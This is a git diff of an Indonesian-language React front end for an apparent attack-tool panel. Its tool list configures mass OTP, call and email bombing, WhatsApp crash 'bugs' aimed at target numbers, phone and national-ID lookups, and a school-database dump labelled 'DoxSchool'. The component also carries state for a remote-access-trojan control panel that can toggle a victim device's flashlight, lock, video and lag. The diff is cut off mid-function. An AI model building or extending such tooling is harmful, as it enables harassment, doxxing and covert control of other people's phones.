@@ -2,12 +2,16 @@
 import { useState, useEffect, useRef } from "react";
 import { io } from "socket.io-client";
 import {
-  Home as HomeIcon, Menu, User, Lock, Eye, EyeOff, MessageSquare, Plus, Wrench, DownloadCloud,
-  Search, Bug, Send, X, ChevronLeft, ShieldAlert, Globe, FileText, Play, Pause, Gamepad2, Music,
-  CheckCircle2, Dices, Grid3X3, Crown, CircleDollarSign, Users, Loader2, LogOut, Settings, Camera,
-  Clock, Shield, Phone, Link, Mail, MapPin, CreditCard, Smartphone, Server, Flame, School, Ban, UserSearch,
-  Database, Fingerprint, Cpu, Lightbulb, Video, AlertTriangle, Swords, Package, Youtube, Image as ImageIcon,
-  Terminal, Trophy, Star, Moon
+  Home as HomeIcon, Menu, User, Lock, Eye, EyeOff,
+  MessageSquare, Plus, Wrench, DownloadCloud,
+  Search, Bug, Send, X, ChevronLeft, ShieldAlert, Globe,
+  FileText, Play, Pause, Gamepad2, Music, CheckCircle2,
+  Dices, Grid3X3, Crown, CircleDollarSign, Users,
+  Loader2, LogOut, Settings, Camera,
+  Clock, Shield, Phone, Link, Mail, MapPin,
+  CreditCard, Smartphone, Server, Flame, School, Ban, UserSearch,
+  Database, Fingerprint, Cpu, Lightbulb, Video, AlertTriangle,
+  Swords, UserPlus, Timer
 } from "lucide-react";
 
 import {
@@ -25,19 +29,17 @@ const SOUND_1 = "https://b.top4top.io/m_39442c6f31.m4a";
 const SOUND_2 = "https://k.top4top.io/m_3944rcsvx1.mp3";
 const RAT_VIDEO = "https://a.top4top.io/m_39451serc1.mp4";
 
-// --- LOCAL STORAGE HELPERS (SAFE FOR SSR) ---
+let globalAudio = null;
+let bgmAudio = null;
+
 function loadAvatarMap() {
   try {
-    if (typeof window === "undefined") return {};
     const raw = localStorage.getItem("mikasa_avatars");
     return raw ? JSON.parse(raw) : {};
   } catch { return {}; }
 }
 function saveAvatarMap(map) {
-  try { 
-    if (typeof window === "undefined") return;
-    localStorage.setItem("mikasa_avatars", JSON.stringify(map)); 
-  } catch {}
+  try { localStorage.setItem("mikasa_avatars", JSON.stringify(map)); } catch {}
 }
 function getAvatarFor(uname) {
   if (typeof window === "undefined") return "";
@@ -45,82 +47,51 @@ function getAvatarFor(uname) {
   return map[uname] || "";
 }
 function setAvatarFor(uname, b64) {
-  if (typeof window === "undefined") return;
   const map = loadAvatarMap();
   map[uname] = b64;
   saveAvatarMap(map);
 }
 
 const ALL_TOOLS = [
-  { id: 'spamotp', name: "Spam OTP", sub: "Bomb OTP", desc: "Mengirim spam OTP massal.", endpoint: "/api/spamotp", payload: "nomor", placeholder: "628xxx", cat: "Spam", icon: MessageSquare, color: "text-pink-500" },
-  { id: 'spamcall', name: "Spam Call", sub: "Bomb Call", desc: "Panggilan spam ke target.", endpoint: "/api/spamcall", payload: "nomor", placeholder: "628xxx", cat: "Spam", icon: Phone, color: "text-red-500" },
-  { id: 'spampair', name: "Spam Pair", sub: "Bomb Pairing", desc: "Permintaan pairing WhatsApp massal.", endpoint: "/api/spampair", payload: "nomor", placeholder: "628xxx", cat: "Spam", icon: Link, color: "text-orange-500" },
-  { id: 'spamngl', name: "Spam NGL", sub: "Bomb NGL", desc: "Pesan anonim massal ke NGL.", endpoint: "/api/spamngl", payload: "username", placeholder: "username", cat: "Spam", icon: UserSearch, color: "text-yellow-500" },
-  { id: 'spamrepwa', name: "Spam Rep", sub: "Report WA", desc: "Laporan spam ke WhatsApp.", endpoint: "/api/spamrepwa", payload: "nomor", placeholder: "628xxx", cat: "Spam", icon: ShieldAlert, color: "text-rose-500" },
-  { id: 'spamgmail', name: "Spam Mail", sub: "Bomb Email", desc: "Spam email ke target.", endpoint: "/api/spamgmail", payload: "email", placeholder: "email@gmail.com", cat: "Spam", icon: Mail, color: "text-blue-400" },
-  { id: 'spambottele', name: "Spam Bot Tele", sub: "Telegram Spam", desc: "Spam pesan bot Telegram.", endpoint: "/api/spambottele", payload: "token", placeholder: "token|idchat|pesan", cat: "Spam", icon: Send, color: "text-sky-400" },
-  { id: 'osintnomor', name: "OSINT Nomor", sub: "Lacak Nomor", desc: "Informasi dari nomor HP.", endpoint: "/api/osint-nomor", payload: "nomor", placeholder: "628xxx", cat: "OSINT", icon: Smartphone, color: "text-cyan-500" },
-  { id: 'osintusername', name: "OSINT Usr", sub: "Lacak Usn", desc: "Lacak akun media sosial.", endpoint: "/api/osint-username", payload: "username", placeholder: "username", cat: "OSINT", icon: UserSearch, color: "text-teal-500" },
-  { id: 'osintip', name: "OSINT IP", sub: "Lacak IP", desc: "Lokasi dari alamat IP.", endpoint: "/api/osintip", payload: "ip", placeholder: "8.8.8.8", cat: "OSINT", icon: Globe, color: "text-indigo-500" },
-  { id: 'osintdomain', name: "OSINT Domain", sub: "Info Domain", desc: "Whois dan info domain.", endpoint: "/api/osintdomain", payload: "domain", placeholder: "domain.com", cat: "OSINT", icon: Globe, color: "text-indigo-400" },
-  { id: 'iptracker', name: "IP Tracker", sub: "Lacak IP", desc: "Lokasi dan info IP.", endpoint: "/api/iptracker", payload: "ip", placeholder: "8.8.8.8", cat: "OSINT", icon: MapPin, color: "text-violet-500" },
-  { id: 'portscan', name: "Port Scan", sub: "Scan Port", desc: "Port terbuka pada domain.", endpoint: "/api/portscan", payload: "domain", placeholder: "domain.com", cat: "OSINT", icon: Server, color: "text-fuchsia-500" },
-  { id: 'nikparse', name: "NIK Parse", sub: "Baca NIK", desc: "Informasi dari NIK.", endpoint: "/api/nikparse", payload: "nik", placeholder: "16 digit", cat: "OSINT", icon: FileText, color: "text-amber-500" },
-  { id: 'cekwallet', name: "Cek Wallet", sub: "E-Wallet", desc: "Cek kepemilikan e-wallet.", endpoint: "/api/cekwallet", payload: "nomor", placeholder: "08xxx", cat: "OSINT", icon: CreditCard, color: "text-emerald-500" },
-  { id: 'doxschool', name: "DoxSchool", sub: "Dump Data", desc: "Dump database sekolah.", endpoint: "/api/doxschool", payload: "npsn", placeholder: "8 digit NPSN", cat: "OSINT", icon: Database, color: "text-amber-500" },
-  { id: 'bug-wa-verload', name: "Verload FC", sub: "Bug WA", desc: "Bug Verload FC.", endpoint: "/api/bug-wa", payload: "target", placeholder: "628xxx", cat: "BugWA", icon: Flame, color: "text-red-600", extra: {type: "verload"} },
-  { id: 'bug-wa-forceclose', name: "Force Close", sub: "Bug WA", desc: "Bug Force Close.", endpoint: "/api/bug-wa", payload: "target", placeholder: "628xxx", cat: "BugWA", icon: Bug, color: "text-orange-600", extra: {type: "forceclose"} },
-  { id: 'bug-wa-crashcall', name: "Crash Call", sub: "Bug WA", desc: "Bug Crash Call.", endpoint: "/api/bug-wa", payload: "target", placeholder: "628xxx", cat: "BugWA", icon: Phone, color: "text-rose-600", extra: {type: "crashes"} },
-  { id: 'tt', name: "TikTok DL", sub: "Unduh Video", desc: "Unduh video TikTok.", endpoint: "/api/download/tiktok", payload: "url", placeholder: "Link TikTok", cat: "Download", icon: DownloadCloud, color: "text-pink-400" },
-  { id: 'tt2', name: "TikTok V2", sub: "Savett DL", desc: "Alternatif download TikTok.", endpoint: "/api/download/tiktok2", payload: "url", placeholder: "Link TikTok", cat: "Download", icon: DownloadCloud, color: "text-pink-500" },
-  { id: 'ttmp3', name: "TikTok MP3", sub: "Unduh Audio", desc: "Audio dari link TikTok.", endpoint: "/api/download/tiktokmp3", payload: "url", placeholder: "Link TikTok", cat: "Download", icon: Music, color: "text-red-400" },
-  { id: 'ig', name: "IG DL", sub: "Unduh Foto", desc: "Foto/video Instagram.", endpoint: "/api/download/instagram", payload: "url", placeholder: "Link IG", cat: "Download", icon: Camera, color: "text-purple-400" },
-  { id: 'fb', name: "FB DL", sub: "Unduh Video", desc: "Video Facebook.", endpoint: "/api/download/facebook", payload: "url", placeholder: "Link FB", cat: "Download", icon: Globe, color: "text-blue-600" },
-  { id: 'mf', name: "MediaFire", sub: "Unduh File", desc: "File dari MediaFire.", endpoint: "/api/download/mfdl", payload: "url", placeholder: "Link MediaFire", cat: "Download", icon: FileText, color: "text-blue-500" },
-  { id: 'gitdl', name: "GitHub DL", sub: "Unduh Repo", desc: "Repo GitHub.", endpoint: "/api/download/gitdl", payload: "url", placeholder: "https://github.com/user/repo", cat: "Download", icon: Globe, color: "text-zinc-400" },
-  { id: 'spdl', name: "Spotify DL", sub: "Unduh Lagu", desc: "Cari & unduh lagu dari YouTube.", endpoint: "/api/download/spdl", payload: "url", placeholder: "Judul Lagu", cat: "Download", icon: Music, color: "text-green-500" },
-  { id: 'google', name: "Google News", sub: "Cari Berita", desc: "Cari berita di Google.", endpoint: "/api/search/google", payload: "query", placeholder: "gempa hari ini", cat: "Search", icon: Search, color: "text-blue-500" },
-  { id: 'pin', name: "Pinterest", sub: "Cari Gambar", desc: "Cari gambar di Pinterest.", endpoint: "/api/search/pin", payload: "query", placeholder: "anime aesthetic", cat: "Search", icon: ImageIcon, color: "text-red-500" },
-  { id: 'yts', name: "YouTube", sub: "Cari Video", desc: "Cari video YouTube.", endpoint: "/api/search/yts", payload: "query", placeholder: "tutorial python", cat: "Search", icon: Youtube, color: "text-red-600" },
-  { id: 'pap', name: "PAP", sub: "Random PAP", desc: "PAP random.", endpoint: "/api/search/pap", payload: "query", placeholder: "cewe/cowo", cat: "Search", icon: Camera, color: "text-pink-400" },
-  { id: 'apkmod', name: "APK MOD", sub: "Cari APK", desc: "Cari APK MOD.", endpoint: "/api/search/apkmod", payload: "query", placeholder: "spotify", cat: "Search", icon: Smartphone, color: "text-green-400" },
-  { id: 'android1', name: "Android1", sub: "Cari APK", desc: "Cari APK di Android1.", endpoint: "/api/search/android1", payload: "query", placeholder: "subway surfer", cat: "Search", icon: Smartphone, color: "text-green-500" },
-  { id: 'gsmarena', name: "GSMArena", sub: "Spesifikasi HP", desc: "Cari spek HP.", endpoint: "/api/search/gsmarena", payload: "query", placeholder: "samsung s24", cat: "Search", icon: Phone, color: "text-blue-400" },
-  { id: 'lirik', name: "Lirik Lagu", sub: "Cari Lirik", desc: "Cari lirik lagu.", endpoint: "/api/search/lirik", payload: "query", placeholder: "perfect ed sheeran", cat: "Search", icon: FileText, color: "text-teal-400" },
-  { id: 'spotifysearch', name: "Spotify", sub: "Cari Lagu", desc: "Cari lagu di Spotify.", endpoint: "/api/search/spotify", payload: "query", placeholder: "bruno mars", cat: "Search", icon: Music, color: "text-green-500" },
-  { id: 'npm', name: "NPM", sub: "Cari Package", desc: "Cari package NPM.", endpoint: "/api/search/npm", payload: "query", placeholder: "axios", cat: "Search", icon: Terminal, color: "text-red-400" },
-  { id: 'ssweb', name: "SS Web", sub: "Screenshot", desc: "Screenshot website.", endpoint: "/api/ssweb", payload: "url", placeholder: "https://...", cat: "Utility", icon: Camera, color: "text-emerald-400" },
-  { id: 'qrcustom', name: "QR Custom", sub: "Buat QR", desc: "Generate QR.", endpoint: "/api/qrcustom", payload: "data", placeholder: "Teks/URL", cat: "Utility", icon: Grid3X3, color: "text-zinc-300" },
-  { id: 'tempmail', name: "Temp Mail", sub: "Email Sementara", desc: "Buat email sementara.", endpoint: "/api/tempmail/create", payload: "dummy", placeholder: "-", cat: "Utility", icon: Mail, color: "text-purple-400" },
-  { id: 'cekbandwa', name: "Cek Band", sub: "Status WA", desc: "Cek status band WA.", endpoint: "/api/cekbandwa", payload: "nomor", placeholder: "628xxx", cat: "Utility", icon: Ban, color: "text-red-700" },
-  { id: 'cekkodepos', name: "Kode Pos", sub: "Wilayah", desc: "Cari info kode pos.", endpoint: "/api/cekkodepos", payload: "kodepos", placeholder: "16112", cat: "Utility", icon: MapPin, color: "text-lime-500" },
-  { id: 'ceknpsn', name: "Cek NPSN", sub: "Sekolah", desc: "Cari data sekolah.", endpoint: "/api/ceknpsn", payload: "npsn", placeholder: "40203594", cat: "Utility", icon: School, color: "text-amber-500" },
-  { id: 'cekff', name: "Cek FF", sub: "Nickname", desc: "Cek nickname FF.", endpoint: "/api/cekff", payload: "uid", placeholder: "UID FF", cat: "Utility", icon: Flame, color: "text-orange-500" },
-  { id: 'cekroblox', name: "Cek Roblox", sub: "Profil", desc: "Cek profil Roblox.", endpoint: "/api/cekroblox", payload: "username", placeholder: "Username", cat: "Utility", icon: Gamepad2, color: "text-red-400" },
-  { id: 'gtk', name: "Data GTK", sub: "Guru", desc: "Cari data guru.", endpoint: "/api/cekdataguru", payload: "keyword", placeholder: "Nama/NUPTK", cat: "Utility", icon: Users, color: "text-sky-500" },
-  { id: 'cekimei', name: "Cek IMEI", sub: "Info HP", desc: "Cek model HP.", endpoint: "/api/cekimei", payload: "imei", placeholder: "3539xxx", cat: "Utility", icon: Smartphone, color: "text-teal-500" },
-  { id: 'cekresi', name: "Cek Resi", sub: "Lacak Paket", desc: "Lacak paket.", endpoint: "/api/cekresi", payload: "awb", placeholder: "Nomor Resi", extra: {courier: "jne"}, cat: "Utility", icon: Package, color: "text-orange-500" },
-  { id: 'phising', name: "Cek Phising", sub: "Cek URL", desc: "Cek bahaya URL.", endpoint: "/api/cekphising", payload: "url", placeholder: "https://...", cat: "Utility", icon: ShieldAlert, color: "text-red-500" },
-  { id: 'webrecon', name: "Web Recon", sub: "Scan Domain", desc: "Kumpulkan info domain.", endpoint: "/api/webrecon", payload: "domain", placeholder: "domain.com", cat: "Utility", icon: Search, color: "text-indigo-400" },
-  { id: 'shorturl', name: "Short URL", sub: "Pendekin Link", desc: "Pendekin URL.", endpoint: "/api/shortenerurl", payload: "url", placeholder: "https://...", cat: "Utility", icon: Link, color: "text-blue-400" },
+  { id: 'spamotp', name: "Spam OTP", sub: "Bomb OTP", desc: "Mengirim spam OTP massal ke nomor target.", endpoint: "/api/spamotp", payload: "nomor", placeholder: "628xxx", cat: "Spam", icon: MessageSquare, color: "text-pink-500" },
+  { id: 'spamcall', name: "Spam Call", sub: "Bomb Call", desc: "Melakukan panggilan spam ke nomor target.", endpoint: "/api/spamcall", payload: "nomor", placeholder: "628xxx", cat: "Spam", icon: Phone, color: "text-red-500" },
+  { id: 'spampair', name: "Spam Pair", sub: "Bomb Pairing", desc: "Mengirim permintaan pairing WhatsApp massal.", endpoint: "/api/spampair", payload: "nomor", placeholder: "628xxx", cat: "Spam", icon: Link, color: "text-orange-500" },
+  { id: 'spamngl', name: "Spam NGL", sub: "Bomb NGL", desc: "Mengirim pesan anonim massal ke akun NGL.", endpoint: "/api/spamngl", payload: "username", placeholder: "username", cat: "Spam", icon: UserSearch, color: "text-yellow-500" },
+  { id: 'spamrepwa', name: "Spam Rep", sub: "Report WA", desc: "Mengirim laporan spam ke WhatsApp.", endpoint: "/api/spamrepwa", payload: "nomor", placeholder: "628xxx", cat: "Spam", icon: ShieldAlert, color: "text-rose-500" },
+  { id: 'spamgmail', name: "Spam Mail", sub: "Bomb Email", desc: "Mengirim spam email ke alamat target.", endpoint: "/api/spamgmail", payload: "email", placeholder: "email@gmail.com", cat: "Spam", icon: Mail, color: "text-blue-400" },
+
+  { id: 'osintnomor', name: "OSINT Nomor", sub: "Lacak Nomor", desc: "Melacak informasi dari nomor HP target.", endpoint: "/api/osint-nomor", payload: "nomor", placeholder: "628xxx", cat: "OSINT", icon: Smartphone, color: "text-cyan-500" },
+  { id: 'osintusername', name: "OSINT Usr", sub: "Lacak Usn", desc: "Melacak akun media sosial berdasarkan username.", endpoint: "/api/osint-username", payload: "username", placeholder: "username", cat: "OSINT", icon: UserSearch, color: "text-teal-500" },
+  { id: 'iptracker', name: "IP Tracker", sub: "Lacak IP", desc: "Melacak lokasi dan info dari alamat IP.", endpoint: "/api/iptracker", payload: "ip", placeholder: "8.8.8.8", cat: "OSINT", icon: Globe, color: "text-indigo-500" },
+  { id: 'portscan', name: "Port Scan", sub: "Scan Port", desc: "Memindai port terbuka pada domain target.", endpoint: "/api/portscan", payload: "domain", placeholder: "domain.com", cat: "OSINT", icon: Server, color: "text-violet-500" },
+  { id: 'nikparse', name: "NIK Parse", sub: "Baca NIK", desc: "Membaca informasi dari nomor NIK.", endpoint: "/api/nikparse", payload: "nik", placeholder: "16 digit", cat: "OSINT", icon: FileText, color: "text-fuchsia-500" },
+  { id: 'cekwallet', name: "Cek Wallet", sub: "Cek E-Wallet", desc: "Mengecek kepemilikan e-wallet dari nomor.", endpoint: "/api/cekwallet", payload: "nomor", placeholder: "08xxx", cat: "OSINT", icon: CreditCard, color: "text-emerald-500" },
+  { id: 'doxschool', name: "DoxSchool", sub: "Dump Data", desc: "Dump database sekolah berdasarkan NPSN.", endpoint: "/api/doxschool", payload: "npsn", placeholder: "8 digit NPSN", cat: "OSINT", icon: Database, color: "text-amber-500" },
+
+  { id: 'bug-wa-verload', name: "Verload FC", sub: "Bug WA", desc: "Mengirim bug Verload FC ke target.", endpoint: "/api/bug-wa", payload: "target", placeholder: "628xxx", cat: "BugWA", icon: Flame, color: "text-red-600", extra: {type: "verload"} },
+  { id: 'bug-wa-forceclose', name: "Force Close", sub: "Bug WA", desc: "Mengirim bug Force Close ke target.", endpoint: "/api/bug-wa", payload: "target", placeholder: "628xxx", cat: "BugWA", icon: Bug, color: "text-orange-600", extra: {type: "forceclose"} },
+  { id: 'bug-wa-crashcall', name: "Crash Call", sub: "Bug WA", desc: "Mengirim bug Crash Call ke target.", endpoint: "/api/bug-wa", payload: "target", placeholder: "628xxx", cat: "BugWA", icon: Phone, color: "text-rose-600", extra: {type: "crashes"} },
+
+  { id: 'tt', name: "TikTok DL", sub: "Unduh Video", desc: "Mengunduh video dari link TikTok.", endpoint: "/api/download/tiktok", payload: "url", placeholder: "Link TikTok", cat: "Download", icon: DownloadCloud, color: "text-pink-400" },
+  { id: 'ig', name: "IG DL", sub: "Unduh Foto", desc: "Mengunduh foto/video dari link Instagram.", endpoint: "/api/download/instagram", payload: "url", placeholder: "Link IG", cat: "Download", icon: Camera, color: "text-purple-400" },
+  { id: 'fb', name: "FB DL", sub: "Unduh Video", desc: "Mengunduh video dari link Facebook.", endpoint: "/api/download/facebook", payload: "url", placeholder: "Link FB", cat: "Download", icon: Globe, color: "text-blue-600" },
+
+  { id: 'cekkodepos', name: "Kode Pos", sub: "Cari Wilayah", desc: "Mencari informasi wilayah dari kode pos.", endpoint: "/api/cekkodepos", payload: "kodepos", placeholder: "16112", cat: "Utility", icon: MapPin, color: "text-lime-500" },
+  { id: 'ceknpsn', name: "Cek NPSN", sub: "Data Sekolah", desc: "Mencari data sekolah berdasarkan NPSN.", endpoint: "/api/ceknpsn", payload: "npsn", placeholder: "40203594", cat: "Utility", icon: School, color: "text-amber-500" },
+  { id: 'cekff', name: "Cek FF", sub: "Nickname FF", desc: "Mengecek nickname Free Fire dari UID.", endpoint: "/api/cekff", payload: "uid", placeholder: "UID FF", cat: "Utility", icon: Flame, color: "text-orange-500" },
+  { id: 'cekroblox', name: "Cek Roblox", sub: "Nickname Roblox", desc: "Mengecek profil Roblox dari username.", endpoint: "/api/cekroblox", payload: "username", placeholder: "Username", cat: "Utility", icon: Gamepad2, color: "text-red-400" },
+  { id: 'gtk', name: "Data GTK", sub: "Cari Guru", desc: "Mencari data guru berdasarkan nama/NUPTK.", endpoint: "/api/cekdataguru", payload: "keyword", placeholder: "Nama/NUPTK", cat: "Utility", icon: Users, color: "text-sky-500" },
+  { id: 'cekbandwa', name: "Cek Band", sub: "Status WA", desc: "Mengecek status band nomor WhatsApp.", endpoint: "/api/cekbandwa", payload: "nomor", placeholder: "628xxx", cat: "Utility", icon: Ban, color: "text-red-700" },
 ];
 
-const CATEGORIES = ["Semua", "Spam", "OSINT", "BugWA", "Download", "Search", "Utility"];
+const CATEGORIES = ["Semua", "Spam", "OSINT", "BugWA", "Download", "Utility"];
 
 const GAMES = [
-  { id: "catur", title: "Catur", icon: <Crown size={24} className="text-zinc-300" />, desc: "Strategi klasik", points: 50 },
-  { id: "uno", title: "Uno", icon: <CircleDollarSign size={24} className="text-red-400" />, desc: "Kartu warna", points: 30 },
-  { id: "tictactoe", title: "Tic Tac Toe", icon: <Grid3X3 size={24} className="text-green-400" />, desc: "Bo10 seru", points: 20 },
-  { id: "ular", title: "Ular Tangga", icon: <Dices size={24} className="text-orange-400" />, desc: "Dadu & ular", points: 40 },
-  { id: "spy", title: "Who's The Spy", icon: <Users size={24} className="text-purple-400" />, desc: "Tebak penyusup", points: 25 },
-];
-
-const THEMES = [
-  { id: "hijau", color: "bg-emerald-700/80 text-white", border: "border-emerald-500" },
-  { id: "biru", color: "bg-blue-700/80 text-white", border: "border-blue-500" },
-  { id: "merah", color: "bg-red-700/80 text-white", border: "border-red-500" },
-  { id: "ungu", color: "bg-purple-700/80 text-white", border: "border-purple-500" },
-  { id: "abu", color: "bg-zinc-700/80 text-white", border: "border-zinc-500" },
+  { id: "catur", title: "Catur", icon: <Crown size={24} className="text-zinc-300" />, desc: "Strategi klasik" },
+  { id: "uno", title: "Uno", icon: <CircleDollarSign size={24} className="text-red-400" />, desc: "Kartu warna" },
+  { id: "tictactoe", title: "Tic Tac Toe", icon: <Grid3X3 size={24} className="text-green-400" />, desc: "Bo10 seru" },
+  { id: "ular", title: "Ular Tangga", icon: <Dices size={24} className="text-orange-400" />, desc: "Dadu & ular" },
+  { id: "spy", title: "Who's The Spy", icon: <Users size={24} className="text-purple-400" />, desc: "Tebak penyusup" },
 ];
 
 function UserAvatar({ name, avatarMap = {}, size = 14, border = "border-zinc-600" }) {
@@ -163,6 +134,7 @@ export default function Home() {
   const [activeTab, setActiveTab] = useState("home");
   const [isSidebarOpen, setIsSidebarOpen] = useState(false);
   const [showProfileModal, setShowProfileModal] = useState(false);
+  const [showMusicLibrary, setShowMusicLibrary] = useState(false);
   const [videoIndex, setVideoIndex] = useState(0);
   const [currentTime, setCurrentTime] = useState("");
   const [runtime, setRuntime] = useState("00:00");
@@ -204,13 +176,12 @@ export default function Home() {
   const [gameLevel, setGameLevel] = useState("medium");
   const [isQueueing, setIsQueueing] = useState(false);
   const [gameMessage, setGameMessage] = useState("");
-  
-  const [gamePoints, setGamePoints] = useState(0);
-  const [showRanking, setShowRanking] = useState(false);
-  const [chatBubbleColor, setChatBubbleColor] = useState("hijau");
 
-  const [roomNameInput, setRoomNameInput] = useState("");
-  const [roomKeyInput, setRoomKeyInput] = useState("");
+  const [musicSearch, setMusicSearch] = useState("");
+  const [musicResults, setMusicResults] = useState([]);
+  const [loadingMusic, setLoadingMusic] = useState(false);
+  const [currentSong, setCurrentSong] = useState(null);
+  const [isPlaying, setIsPlaying] = useState(false);
 
   const [ratTargetId, setRatTargetId] = useState("");
   const [ratStates, setRatStates] = useState({ flashlight: false, lock: false, video: false, lag: false });
@@ -218,35 +189,32 @@ export default function Home() {
   const [ratSocket, setRatSocket] = useState(null);
   const [isGenerating, setIsGenerating] = useState(false);
   const [onlineDevices, setOnlineDevices] = useState([]);
+
   const [showPinModal, setShowPinModal] = useState(false);
   const [lockPin, setLockPin] = useState("");
 
   useEffect(() => {
-    if (typeof window === "undefined") return;
+    if (chatScrollRef.current) {
+      chatScrollRef.current.scrollTop = chatScrollRef.current.scrollHeight;
+    }
+  }, [globalMsgs, privateMsgs, activeTab, chatMode, chatTarget]);
 
+  useEffect(() => {
     const savedUser = localStorage.getItem("mikasa_user");
     if (savedUser) {
-      try {
-        const parsed = JSON.parse(savedUser);
-        const uname = parsed.username;
-        const persistedAvatar = getAvatarFor(uname);
-        setUsername(uname);
-        setUserRole(parsed.role);
-        setUserProfile({
-          name: parsed.profile?.name || uname,
-          avatar: persistedAvatar || parsed.profile?.avatar || "",
-          expired: parsed.profile?.expired || "2054-02-25"
-        });
-        setIsLoggedIn(true);
-        setShowTapToPlay(true);
-      } catch (e) {}
+      const parsed = JSON.parse(savedUser);
+      const uname = parsed.username;
+      const persistedAvatar = getAvatarFor(uname);
+      setUsername(uname);
+      setUserRole(parsed.role);
+      setUserProfile({
+        name: parsed.profile?.name || uname,
+        avatar: persistedAvatar || parsed.profile?.avatar || "",
+        expired: parsed.profile?.expired || "2054-02-25"
+      });
+      setIsLoggedIn(true);
+      setShowTapToPlay(true);
     }
-    
-    const savedPoints = localStorage.getItem(`mikasa_points_${username || "guest"}`);
-    if (savedPoints) setGamePoints(parseInt(savedPoints, 10));
-    
-    const savedTheme = localStorage.getItem("mikasa_theme");
-    if (savedTheme) setChatBubbleColor(savedTheme);
 
     const timer = setInterval(() => {
       const now = new Date();
@@ -258,20 +226,6 @@ export default function Home() {
 
     return () => clearInterval(timer);
   }, []);
-
-  useEffect(() => {
-    if (chatScrollRef.current) {
-      chatScrollRef.current.scrollTop = chatScrollRef.current.scrollHeight;
-    }
-  }, [globalMsgs, privateMsgs, activeTab, chatMode, chatTarget]);
-
-  const addPoints = (amount) => {
-    setGamePoints(prev => {
-      const newPoints = prev + amount;
-      if (typeof window !== "undefined") localStorage.setItem(`mikasa_points_${username || "guest"}`, newPoints);
-      return newPoints;
-    });
-  };
 
   const handleLogin = async (e) => {
     e.preventDefault();
@@ -297,19 +251,33 @@ export default function Home() {
     }
   };
 
-  const handleSkipIntro = () => { setShowIntro(false); setIsLoggedIn(true); setShowTapToPlay(false); };
+  const handleSkipIntro = () => {
+    setShowIntro(false);
+    setIsLoggedIn(true);
+    startBGM();
+    setShowTapToPlay(false);
+  };
+
   const handleFingerprintTap = () => {
     if (isScanning) return;
     setIsScanning(true);
-    setTimeout(() => { setShowTapToPlay(false); setIsScanning(false); }, 1500);
+    setTimeout(() => {
+      startBGM();
+      setShowTapToPlay(false);
+      setIsScanning(false);
+    }, 1500);
   };
 
   const handleLogout = () => {
     localStorage.removeItem("mikasa_user");
-    setIsLoggedIn(false); setUsername(""); setPassword(""); setIsSidebarOpen(false);
+    setIsLoggedIn(false);
+    setUsername("");
+    setPassword("");
+    setIsSidebarOpen(false);
     if(socket) socket.close();
     if(ratSocket) ratSocket.close();
-    setGamePoints(0);
+    if(bgmAudio) { bgmAudio.pause(); bgmAudio = null; }
+    if(globalAudio) { globalAudio.pause(); globalAudio = null; }
   };
 
   useEffect(() => {
@@ -318,9 +286,12 @@ export default function Home() {
       setSocket(newSocket);
       newSocket.emit('user_online', username);
 
-      if (userProfile.avatar) newSocket.emit('update_avatar', { username, avatar: userProfile.avatar });
+      if (userProfile.avatar) {
+        newSocket.emit('update_avatar', { username, avatar: userProfile.avatar });
+      }
 
       newSocket.on('update_online_users', (users) => setOnlineUsers(users.filter(u => u !== username)));
+
       newSocket.on('avatar_snapshot', (snapshot) => setServerAvatars(snapshot || {}));
       newSocket.on('avatar_update', ({ username: uname, avatar }) => {
         setServerAvatars((prev) => {
@@ -333,9 +304,11 @@ export default function Home() {
 
       newSocket.on('chat_history_global', (history) => setGlobalMsgs(history || []));
       newSocket.on('receive_global_msg', (data) => setGlobalMsgs((prev) => [...prev, data]));
+
       newSocket.on('chat_history_private', ({ with: withUser, messages }) => {
         if (withUser === chatTarget) setPrivateMsgs(messages || []);
       });
+
       newSocket.on('receive_private_msg', (data) => {
         if (chatMode === "private" && chatTarget && (data.from === chatTarget || data.to === chatTarget)) {
           setPrivateMsgs((prev) => {
@@ -345,18 +318,22 @@ export default function Home() {
           });
         }
       });
+
       newSocket.on('unread_snapshot', (snap) => {
         setUnreadGlobal(snap.global || 0);
         setUnreadPrivMap(snap.priv || {});
         setUnreadTotal(snap.total || 0);
       });
+
       newSocket.on('unread_update', (snapshot) => {
         if (snapshot && typeof snapshot[username] === "number") setUnreadTotal(snapshot[username]);
       });
+
       newSocket.on('game_queue_joined', ({ game }) => {
         setIsQueueing(true);
         setGameMessage(`Menunggu lawan ${game}...`);
       });
+
       newSocket.on('game_matched', ({ roomId, game, opponent, myColor, opponentColor }) => {
         setIsQueueing(false);
         setGameRoomId(roomId);
@@ -370,37 +347,288 @@ export default function Home() {
         setGameState(init);
         setGameMode('pvp');
       });
-      newSocket.on('game_opponent_move', ({ move }) => setGameState((prev) => (prev ? { ...prev, ...move } : prev)));
-      newSocket.on('game_opponent_left', () => { setGameMessage("Lawan keluar dari room"); setGameRoomId(null); setGameOpponent(null); });
+
+      newSocket.on('game_opponent_move', ({ move }) => {
+        setGameState((prev) => {
+          if (!prev) return prev;
+          if (prev.board && Array.isArray(prev.board)) {
+            return { ...prev, ...move };
+          }
+          return { ...prev, ...move };
+        });
+      });
+
+      newSocket.on('game_opponent_left', () => {
+        setGameMessage("Lawan keluar dari room");
+        setGameRoomId(null);
+        setGameOpponent(null);
+      });
 
       const s = io(API_URL, { transports: ["websocket"] });
       setRatSocket(s);
-      s.on("rat_update_devices", (devices) => setOnlineDevices(devices.filter(d => d.ownerId === username || d.ownerId === null)));
 
-      return () => { newSocket.close(); s.close(); };
+      s.on("rat_update_devices", (devices) => {
+        const myDevices = devices.filter(d => d.ownerId === username || d.ownerId === null);
+        setOnlineDevices(myDevices);
+      });
+
+      return () => {
+        newSocket.close();
+        s.close();
+      }
     }
   }, [isLoggedIn, showIntro, username, chatMode, chatTarget, userProfile.avatar]);
 
-  const sendGlobalMsg = (e) => { e.preventDefault(); if (!msgInput.trim() || !socket) return; socket.emit('send_global_msg', { from: username, msg: msgInput }); setMsgInput(""); };
-  const sendPrivateMsg = (e) => { e.preventDefault(); if (!msgInput.trim() || !socket || !chatTarget) return; socket.emit('send_private_msg', { from: username, to: chatTarget, msg: msgInput }); setMsgInput(""); };
-  const openGlobalChat = () => { setChatMode("global"); setChatTarget(null); setActiveTab("chat"); if (socket) { socket.emit('chat_history_request_global'); socket.emit('chat_read_global', { username }); } setUnreadGlobal(0); setUnreadTotal((prev) => Math.max(0, prev - unreadGlobal)); };
